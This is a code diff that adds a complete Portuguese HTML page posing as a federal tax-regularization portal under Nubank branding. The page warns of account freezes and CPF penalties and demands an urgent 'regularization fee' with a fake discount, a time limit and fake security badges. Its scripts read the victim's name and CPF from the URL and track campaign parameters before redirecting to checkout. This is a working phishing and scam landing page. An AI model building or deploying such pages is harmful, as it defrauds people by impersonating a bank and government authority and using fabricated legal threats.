@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portal de Regularização Fiscal Federal</title>
+    <link rel="icon" href="https://nu-indeniza.noticiais.is/favicon.ico" type="image/x-icon" sizes="256x256">
+    <script src="https://cdn.tailwindcss.com/"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Rawline:wght@400;500;600;700&amp;display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/all.min.css">
+      <script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "rbelpph67g");
+</script>
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+<script>
+  window.pixelId = "673cd18ac1a87f0eeb7b11d4";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+    <style>
+        :root {
+            --blue-10: #403151;
+            --blue-20: #831BD1;
+            --blue-30: #000000;
+            --gray-10: #F8F9FA;
+            --gray-20: #ECEEF1;
+        }
+
+        body {
+            font-family: 'Rawline', sans-serif;
+            margin: 0;
+            padding: 0;
+            background: var(--gray-10);
+            min-width: 320px;
+        }
+
+        .barra-governo {
+            background: var(--blue-10);
+            height: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .barra-governo span {
+            color: white;
+            font-size: 16px;
+            font-weight: 400;
+        }
+
+        .header-top {
+            background: var(--blue-30);
+            padding: 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .header-logo {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .header-logo img {
+            height: 32px;
+        }
+
+        .header-logo span {
+            color: white;
+            font-size: 24px;
+            font-weight: 600;
+            border-left: 1px solid rgba(255, 255, 255, 0.2);
+            padding-left: 16px;
+        }
+
+        .breadcrumb {
+            background: white;
+            padding: 16px 24px;
+            border-bottom: 1px solid var(--gray-20);
+            color: var(--blue-20);
+            font-size: 14px;
+        }
+
+        .breadcrumb i {
+            font-size: 12px;
+            margin: 0 8px;
+        }
+
+        .main-container {
+            max-width: 1140px;
+            margin: 0 auto;
+            padding: 40px 24px;
+        }
+
+        .card {
+            background: white;
+            border-radius: 4px;
+            border: 1px solid var(--gray-20);
+            padding: 24px;
+            margin-bottom: 24px;
+        }
+
+        .card-title {
+            color: var(--blue-10);
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 24px;
+        }
+
+        .alert {
+            background: #FFF3CD;
+            border: 1px solid #FFEEBA;
+            border-radius: 4px;
+            padding: 16px;
+            margin-bottom: 24px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .alert i {
+            color: #856404;
+            font-size: 20px;
+        }
+
+        .alert p {
+            color: #856404;
+            font-weight: 500;
+            margin: 0;
+        }
+
+        .status-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px 0;
+            border-bottom: 1px solid var(--gray-20);
+        }
+
+        .status-item:last-child {
+            border-bottom: none;
+        }
+
+        .status-item i {
+            font-size: 20px;
+        }
+
+        .status-item.success i {
+            color: #168821;
+        }
+
+        .status-item.warning i {
+            color: #DC3545;
+        }
+
+        .price-box {
+            background: #E9F8FF;
+            border: 1px solid #BEE5EB;
+            border-radius: 4px;
+            padding: 24px;
+            text-align: center;
+            margin: 24px 0;
+        }
+
+        .price-old {
+            color: #6C757D;
+            text-decoration: line-through;
+            font-size: 16px;
+        }
+
+        .price-new {
+            color: var(--blue-20);
+            font-size: 32px;
+            font-weight: 700;
+            margin: 8px 0;
+        }
+
+        .price-info {
+            color: #6C757D;
+            font-size: 14px;
+        }
+
+        .btn-primary {
+            background: var(--blue-20);
+            color: white;
+            border: none;
+            border-radius: 24px;
+            padding: 16px 32px;
+            font-size: 16px;
+            font-weight: 600;
+            width: 100%;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .btn-primary:hover {
+            background: #6F17B1;
+        }
+
+        .security-badges {
+            display: flex;
+            justify-content: center;
+            gap: 32px;
+            margin-top: 32px;
+            color: #6C757D;
+        }
+
+        .security-badges i {
+            margin-right: 8px;
+        }
+
+        .shake {
+            animation: shake 0.5s infinite;
+        }
+
+        @keyframes shake {
+            0% {
+                transform: translateX(0);
+            }
+
+            25% {
+                transform: translateX(-2px);
+            }
+
+            75% {
+                transform: translateX(2px);
+            }
+
+            100% {
+                transform: translateX(0);
+            }
+        }
+
+        @media (max-width: 768px) {
+            .header-logo span {
+                font-size: 20px;
+            }
+
+            .main-container {
+                padding: 24px 16px;
+            }
+
+            .security-badges {
+                flex-direction: column;
+                align-items: center;
+                gap: 16px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+
+    <div class="header-top">
+        <div class="header-logo">
+            <img src="images/nu.webp" alt="Nubank">
+            <span>Portal de Regularização</span>
+        </div>
+    </div>
+
+    <div class="breadcrumb">
+        <span>Início</span>
+        <i class="fas fa-chevron-right"></i>
+        <span>Regularização Fiscal</span>
+        <i class="fas fa-chevron-right"></i>
+        <span>Pendências</span>
+    </div>
+
+    <main class="main-container">
+        <div class="card">
+            <h1 class="card-title">Regularização Fiscal</h1>
+
+            <div class="alert">
+                <i class="fas fa-exclamation-triangle shake"></i>
+                <p>ATENÇÃO: Pendência fiscal identificada</p>
+            </div>
+
+            <div class="status-list">
+                <div class="status-item success">
+                    <i class="fas fa-check-circle"></i>
+                    <span>Identificação do contribuinte</span>
+                </div>
+                <div class="status-item success">
+                    <i class="fas fa-check-circle"></i>
+                    <span>Verificação de documentos</span>
+                </div>
+                <div class="status-item warning">
+                    <i class="fas fa-exclamation-circle"></i>
+                    <span>Pendência de regularização fiscal</span>
+                </div>
+            </div>
+
+            <div style="margin-top: 24px;">
+                <p style="margin-bottom: 16px;">Foi identificada uma <strong style="color: #DC3545">pendência
+                        fiscal</strong> que requer ação imediata. Para evitar:</p>
+                <ul style="list-style: disc; margin-left: 24px; margin-bottom: 24px;">
+                    <li style="margin-bottom: 8px;">Bloqueio de contas bancárias</li>
+                    <li style="margin-bottom: 8px;">Restrições no CPF/CNPJ</li>
+                    <li style="margin-bottom: 8px;">Multas adicionais</li>
+                    <li>Processo administrativo</li>
+                </ul>
+                <p>É necessário efetuar o pagamento da <strong>Taxa de Regularização Federal</strong> no valor de:</p>
+            </div>
+
+            <div class="price-box">
+                <div class="price-old">R$ 147,90</div>
+                <div class="price-new">R$ 17,90</div>
+                <div class="price-info">Valor com desconto - Pagamento imediato</div>
+            </div>
+
+            <button onclick="checkout(event)" class="btn-primary">
+                <i class="fas fa-lock"></i> REGULARIZAR AGORA
+            </button>
+
+            <div style="text-align: center; margin-top: 16px; color: #6C757D; font-size: 14px;">
+                <i class="fas fa-clock"></i> Oferta válida por tempo limitado
+            </div>
+        </div>
+
+        <div class="security-badges">
+            <div>
+                <i class="fas fa-shield-alt"></i>
+                Site Seguro
+            </div>
+            <div>
+                <i class="fas fa-lock"></i>
+                Dados Protegidos
+            </div>
+        </div>
+    </main>
+
+    <script>
+            function buildUrlWithParams(baseUrl, params) {
+            const queryString = Object.keys(params)
+                .map(key => `${encodeURIComponent(key)}=${encodeURIComponent(params[key])}`)
+                .join('&');
+        
+            return `${baseUrl}&${queryString}`;
+        }
+        function checkout(event) {
+            event.preventDefault();
+
+                const urlParams = new URLSearchParams(window.location.search);
+                const nome = urlParams.get('nome')
+                const cpf = urlParams.get('cpf')
+                const valor = urlParams.get('valor')
+                const extractUTMParams = () => {
+                    const urlParams = new URLSearchParams(window.location.search);
+                    return {
+                        utm_source: urlParams.get('utm_source') || '',
+                        utm_campaign: urlParams.get('utm_campaign') || '',
+                        utm_medium: urlParams.get('utm_medium') || '',
+                        utm_content: urlParams.get('utm_content') || '',
+                        utm_term: urlParams.get('utm_term') || '',
+                        subid: urlParams.get('subid') || '',
+                        sid2: urlParams.get('sid2') || '',
+                        subid2: urlParams.get('subid2') || '',
+                        subid3: urlParams.get('subid3') || '',
+                        subid4: urlParams.get('subid4') || '',
+                        subid5: urlParams.get('subid5') || '',
+                        xcod: urlParams.get('xcod') || '',
+                        sck: urlParams.get('sck') || ''
+                    };
+                };
+
+                    const utms = extractUTMParams();
+        
+                // Constrói a nova URL com os parâmetros
+                const newUrl = buildUrlWithParams(`https://google.com`, utms);
+                window.location.href = newUrl;
+        }
+    </script>
+
+
+
+</body>
+
+</html>
